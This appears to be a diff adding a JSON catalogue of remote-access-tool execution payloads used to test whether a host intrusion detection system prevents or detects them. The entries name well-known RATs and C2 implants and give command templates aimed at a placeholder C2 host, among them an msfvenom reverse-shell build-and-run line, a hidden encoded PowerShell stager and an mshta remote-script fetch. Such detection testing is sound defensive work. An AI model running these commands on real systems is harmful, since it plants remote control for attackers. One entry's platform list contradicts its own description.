@@ -1,0 +1,936 @@
+[
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: msfvenom linux/x64",
+    "payload_external_id": "HIDS-RATEXECUTION-001",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "msfvenom 生成 ELF meterpreter reverse_tcp。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1219"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={{C2_HOST}} LPORT={{C2_PORT}} -f elf -o /tmp/m && chmod +x /tmp/m && /tmp/m",
+    "hids_artifact_path": "/tmp/m",
+    "hids_expected_artifacts": [
+      "file_create:/tmp/m",
+      "tcp_outbound:{{C2_HOST}}:{{C2_PORT}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: msfvenom windows/x64",
+    "payload_external_id": "HIDS-RATEXECUTION-002",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "msfvenom 生成 PE meterpreter。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1219"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={{C2_HOST}} LPORT={{C2_PORT}} -f exe -o m.exe & m.exe",
+    "hids_artifact_path": "m.exe",
+    "hids_expected_artifacts": [
+      "proc:m.exe",
+      "tcp_outbound:{{C2_HOST}}:{{C2_PORT}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: Sliver beacon",
+    "payload_external_id": "HIDS-RATEXECUTION-003",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Sliver beacon implant 长连接 C2（开源 CS 替代）。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1071.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "sliver_beacon --c2 https://{{C2_HOST}}/beacon",
+    "hids_artifact_path": "sliver_beacon",
+    "hids_expected_artifacts": [
+      "proc:sliver_beacon",
+      "tls_outbound:{{C2_HOST}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: Cobalt Strike beacon",
+    "payload_external_id": "HIDS-RATEXECUTION-004",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "CobaltStrike DNS/HTTPS beacon 触发（最常见红队 C2）。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1218.011"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "rundll32 cs_beacon.dll,Start",
+    "hids_artifact_path": "cs_beacon.dll",
+    "hids_expected_artifacts": [
+      "proc:rundll32.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: Mythic apfell",
+    "payload_external_id": "HIDS-RATEXECUTION-005",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Mythic apfell macOS / JXA agent。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.007"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "osascript -l JavaScript apfell.js",
+    "hids_artifact_path": "apfell.js",
+    "hids_expected_artifacts": [
+      "proc:osascript"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: Mythic athena",
+    "payload_external_id": "HIDS-RATEXECUTION-006",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Mythic Athena .NET agent。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1218"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "athena.exe -c {{C2_HOST}}:{{C2_PORT}}",
+    "hids_artifact_path": "athena.exe",
+    "hids_expected_artifacts": [
+      "proc:athena.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: Havoc demon",
+    "payload_external_id": "HIDS-RATEXECUTION-007",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Havoc Demon shellcode loader。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1219"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "havoc_demon.exe",
+    "hids_artifact_path": "havoc_demon.exe",
+    "hids_expected_artifacts": [
+      "proc:havoc_demon.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: Brc4 badger",
+    "payload_external_id": "HIDS-RATEXECUTION-008",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Brute Ratel C4 Badger implant（商业红队）。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1219"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "badger.exe",
+    "hids_artifact_path": "badger.exe",
+    "hids_expected_artifacts": [
+      "proc:badger.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: Empire stager",
+    "payload_external_id": "HIDS-RATEXECUTION-009",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "PowerShell Empire stager 一句话。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "powershell -nop -w hidden -encodedCommand {{EMPIRE_STAGER_B64}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:powershell.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: Covenant grunt",
+    "payload_external_id": "HIDS-RATEXECUTION-010",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Covenant C# Grunt implant。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1219"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "Grunt.exe",
+    "hids_artifact_path": "Grunt.exe",
+    "hids_expected_artifacts": [
+      "proc:Grunt.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: Merlin agent",
+    "payload_external_id": "HIDS-RATEXECUTION-011",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Merlin Go agent (HTTP/3 / QUIC C2)。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1071.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "merlin_agent --url https://{{C2_HOST}}",
+    "hids_artifact_path": "merlin_agent",
+    "hids_expected_artifacts": [
+      "proc:merlin_agent"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: Faction agent",
+    "payload_external_id": "HIDS-RATEXECUTION-012",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Faction Python agent。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.006"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "python3 faction.py --c2 {{C2_HOST}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:python3"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: Apollo agent",
+    "payload_external_id": "HIDS-RATEXECUTION-013",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Mythic Apollo C# implant。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1219"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "Apollo.exe -k {{API_KEY}}",
+    "hids_artifact_path": "Apollo.exe",
+    "hids_expected_artifacts": [
+      "proc:Apollo.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: Tetanus agent",
+    "payload_external_id": "HIDS-RATEXECUTION-014",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Mythic Tetanus Rust agent (cross-plat)。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1219"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "tetanus -c {{C2_HOST}}",
+    "hids_artifact_path": "tetanus",
+    "hids_expected_artifacts": [
+      "proc:tetanus"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: Quasar RAT",
+    "payload_external_id": "HIDS-RATEXECUTION-015",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "QuasarRAT 老牌 .NET RAT。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1219"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "Quasar.Client.exe",
+    "hids_artifact_path": "Quasar.Client.exe",
+    "hids_expected_artifacts": [
+      "proc:Quasar.Client.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: njRAT",
+    "payload_external_id": "HIDS-RATEXECUTION-016",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "njRAT VB.NET RAT（普及型 APT 组件）。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1219"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "njrat.exe",
+    "hids_artifact_path": "njrat.exe",
+    "hids_expected_artifacts": [
+      "proc:njrat.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: DarkComet",
+    "payload_external_id": "HIDS-RATEXECUTION-017",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "DarkComet RAT (Delphi 老牌)。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1219"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "darkcomet.exe",
+    "hids_artifact_path": "darkcomet.exe",
+    "hids_expected_artifacts": [
+      "proc:darkcomet.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: AsyncRAT",
+    "payload_external_id": "HIDS-RATEXECUTION-018",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "AsyncRAT C# RAT。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1219"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "asyncrat.exe -k {{KEY}}",
+    "hids_artifact_path": "asyncrat.exe",
+    "hids_expected_artifacts": [
+      "proc:asyncrat.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: Remcos RAT",
+    "payload_external_id": "HIDS-RATEXECUTION-019",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Remcos 商业级 RAT（多见钓鱼附件投递）。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1219"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "remcos.exe",
+    "hids_artifact_path": "remcos.exe",
+    "hids_expected_artifacts": [
+      "proc:remcos.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: NanoCore RAT",
+    "payload_external_id": "HIDS-RATEXECUTION-020",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "NanoCore .NET RAT。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1219"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "NanoCore.exe",
+    "hids_artifact_path": "NanoCore.exe",
+    "hids_expected_artifacts": [
+      "proc:NanoCore.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: PlugX",
+    "payload_external_id": "HIDS-RATEXECUTION-021",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "PlugX APT 木马（多见 China-nexus 组织）。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1219"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "plugx_loader.exe",
+    "hids_artifact_path": "plugx_loader.exe",
+    "hids_expected_artifacts": [
+      "proc:plugx_loader.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: gh0st RAT linux",
+    "payload_external_id": "HIDS-RATEXECUTION-022",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "gh0st RAT 改造 linux 版本（kaiten / ELKnot 变种）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1219"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "/tmp/gh0st -c {{C2_HOST}}",
+    "hids_artifact_path": "/tmp/gh0st",
+    "hids_expected_artifacts": [
+      "proc:gh0st"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: PoisonIvy",
+    "payload_external_id": "HIDS-RATEXECUTION-023",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "PoisonIvy RAT (老牌 APT)。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1219"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "poisonivy.exe",
+    "hids_artifact_path": "poisonivy.exe",
+    "hids_expected_artifacts": [
+      "proc:poisonivy.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: PupyRAT",
+    "payload_external_id": "HIDS-RATEXECUTION-024",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "PupyRAT 跨平台 reflective DLL injection RAT。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1055"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "pupy --connect {{C2_HOST}}",
+    "hids_artifact_path": "pupy",
+    "hids_expected_artifacts": [
+      "proc:pupy"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Rat Execution: Koadic",
+    "payload_external_id": "HIDS-RATEXECUTION-025",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Koadic / COMmand & Control，基于 mshta JS。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1218.005"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "rat_execution"
+    ],
+    "hids_category": "rat_execution",
+    "hids_execution_mode": "command",
+    "hids_command_template": "mshta http://{{C2_HOST}}/koadic.js",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:mshta.exe"
+    ]
+  }
+]
